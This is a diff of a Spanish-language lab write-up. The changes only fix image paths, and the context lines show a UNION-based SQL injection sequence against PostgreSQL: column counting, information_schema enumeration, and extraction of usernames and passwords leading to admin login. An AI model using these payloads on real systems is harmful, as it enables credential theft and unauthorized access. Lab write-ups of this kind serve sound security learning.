@@ -21,7 +21,7 @@ Extraer usuarios y contraseñas desde otra tabla de la base de datos.
 ' order by 2 -- -
 ```
 
-![Enumeración columnas](../../../../Imagenes/pasted-image-20260403204953.png)
+![Enumeración columnas](../../../Imagenes/pasted-image-20260403204953.png)
 
 ---
 
@@ -30,7 +30,7 @@ Extraer usuarios y contraseñas desde otra tabla de la base de datos.
 ' union select 'a','b' -- -
 ```
 
-![Validación columnas](../../../../Imagenes/pasted-image-20260403205119.png)
+![Validación columnas](../../../Imagenes/pasted-image-20260403205119.png)
 
 ---
 
@@ -50,7 +50,7 @@ Probamos PostgreSQL:
 version()
 ```
 
-![Versión PostgreSQL](../../../../Imagenes/pasted-image-20260403205344.png)
+![Versión PostgreSQL](../../../Imagenes/pasted-image-20260403205344.png)
 
 ---
 
@@ -60,13 +60,13 @@ version()
 ' union select table_name,null from information_schema.tables -- -
 ```
 
-![Listado tablas](../../../../Imagenes/pasted-image-20260403205509.png)
+![Listado tablas](../../../Imagenes/pasted-image-20260403205509.png)
 
 ---
 
 ## 🔍 Tabla users
 
-![Tabla users](../../../../Imagenes/pasted-image-20260403205615.png)
+![Tabla users](../../../Imagenes/pasted-image-20260403205615.png)
 
 ---
 
@@ -76,7 +76,7 @@ version()
 ' union select column_name,null from information_schema.columns where table_name='users' -- -
 ```
 
-![Columnas users](../../../../Imagenes/pasted-image-20260403205757.png)
+![Columnas users](../../../Imagenes/pasted-image-20260403205757.png)
 
 ---
 
@@ -86,13 +86,13 @@ version()
 ' union select username,password from users -- -
 ```
 
-![Credenciales](../../../../Imagenes/pasted-image-20260403205933.png)
+![Credenciales](../../../Imagenes/pasted-image-20260403205933.png)
 
 ---
 
 ## 🔓 Acceso administrador
 
-![Login administrador](../../../../Imagenes/pasted-image-20260403210026.png)
+![Login administrador](../../../Imagenes/pasted-image-20260403210026.png)
 
 ---
 
